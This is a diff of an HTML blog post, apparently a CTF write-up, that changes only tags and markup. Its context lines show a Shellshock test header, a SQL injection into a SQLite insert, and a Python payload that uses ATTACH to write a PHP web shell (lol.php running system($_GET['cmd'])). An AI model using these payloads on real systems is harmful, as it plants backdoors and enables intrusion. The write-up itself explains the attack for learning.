@@ -49,6 +49,7 @@
                                 <a class="post-category" href="/tag/sqlite/">sqlite</a>
                                 <a class="post-category" href="/tag/sqli/">sqli</a>
                                 <a class="post-category" href="/tag/shellshock/">shellshock</a>
+                                <a class="post-category" href="/tag/writeup/">writeup</a>
                         </p>
                 </header>
             </section>
@@ -74,7 +75,7 @@ User-Agent: () { :;}; echo &#39;ShellShockTester_atdog&#39;;
 Host: 140.113.235.153:5566
 Accept: */*
 </pre></div>
-<p>Ah-ha! The string <cite>{ :;}; echo 'ShellShockTester_atdog';</cite> is a typical method to
+<p>Ah-ha! The string <tt class="docutils literal">{ <span class="pre">:;};</span> echo 'ShellShockTester_atdog';</tt> is a typical method to
 test if the bash which is currently using is vulnerable to CVE-2014-6271. A
 system which is vulnerable will echo the string &quot;ShellShockTester_atdog&quot;.
 Similarly, the target website which runs CGI program will return the string if
@@ -83,7 +84,7 @@ ShellShock Tester?</p>
 <p>Building a simple HTTP server using python module <a class="reference external" href="http://flask.pocoo.org">Flask</a>. It returns the
 string when the ShellShock Tester queried for the index page. It seems that the
 ShellShock Tester stores the response returned from the target website into its
-database using <cite>insert</cite>. At the time the type of the database is still unknown.</p>
+database using <tt class="docutils literal">insert</tt>. At the time the type of the database is still unknown.</p>
 <p>So I append a single quote right after the string, and the result showed on the
 ShellShock Tester is:</p>
 <div class="highlight"><pre>DATABASE Msg: unrecognized token: &quot;&#39;ShellShockTester_atdog&#39;&#39;)&quot;
@@ -123,9 +124,9 @@ directory of the website.</p>
 <span class="n">inj</span> <span class="o">=</span> <span class="s">&#39;ATTACH </span><span class="se">\&#39;</span><span class="s">./lol.php</span><span class="se">\&#39;</span><span class="s"> AS lol; CREATE TABLE lol.pwn (dataz TEXT); INSERT INTO lol.pwn (dataz) VALUES (</span><span class="se">\&#39;</span><span class="s">&lt;pre&gt;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&lt;/pre&gt;</span><span class="se">\&#39;</span><span class="s">);&#39;</span>
 <span class="n">resp</span> <span class="o">=</span> <span class="n">trick</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">inj</span><span class="p">)</span>
 </pre></div>
-<p>This will build a backdoor called <cite>lol.php</cite>. So anyone can visit that page along
-with a &quot;GET&quot; argument <cite>cmd</cite>. The value of <cite>cmd</cite> could be any shell command. The
-reason is that <cite>ATTACH</cite> command will attach a SQLite database. If the database
+<p>This will build a backdoor called <tt class="docutils literal">lol.php</tt>. So anyone can visit that page along
+with a &quot;GET&quot; argument <tt class="docutils literal">cmd</tt>. The value of <tt class="docutils literal">cmd</tt> could be any shell command. The
+reason is that <tt class="docutils literal">ATTACH</tt> command will attach a SQLite database. If the database
 does not exist, it create the database which is a PHP file. The file's content
 contains a short piece of PHP code showed above.</p>
 <p>Simply visit the page &quot;<a class="reference external" href="http://tor.atdog.tw:8888/lol.php?cmd=ls">http://tor.atdog.tw:8888/lol.php?cmd=ls</a>&quot;, it will list
